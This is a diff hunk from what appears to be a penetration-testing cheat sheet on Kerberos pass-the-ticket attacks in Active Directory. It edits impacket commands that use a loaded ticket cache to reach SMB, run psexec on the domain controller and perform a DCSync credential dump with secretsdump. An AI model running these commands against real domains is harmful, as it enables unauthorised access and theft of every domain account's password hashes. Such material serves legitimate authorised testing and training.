@@ -225,13 +225,14 @@ export KRB5CCNAME=/path/to/ticket.ccache
 klist  # Verify
 
 # SMB
-impacket-smbclient -k -no-pass -dc-ip $DC_IP $DOMAIN/$USER@$TARGET
+impacket-smbclient -k -no-pass -dc-ip "$DC_IP" "$DOMAIN/$USER@$DC_HOST"
 
 # PSExec
-impacket-psexec -k -no-pass -dc-ip $DC_IP $DOMAIN/$USER@$TARGET
+impacket-psexec -k -no-pass -dc-ip "$DC_IP" "$DOMAIN/$USER@$DC_HOST"
+impacket-psexec -k -no-pass -dc-ip "$DC_HOST" @"$DC_HOST"
 
 # Secretsdump (DCSync)
-impacket-secretsdump -k -no-pass -dc-ip $DC_IP $DOMAIN/$USER@$DC_IP
+impacket-secretsdump -k -no-pass -dc-ip "$DC_IP" "$DOMAIN/$USER@$DC_HOST"
 ```
 
 ### Configure /etc/krb5.conf for Kerberos
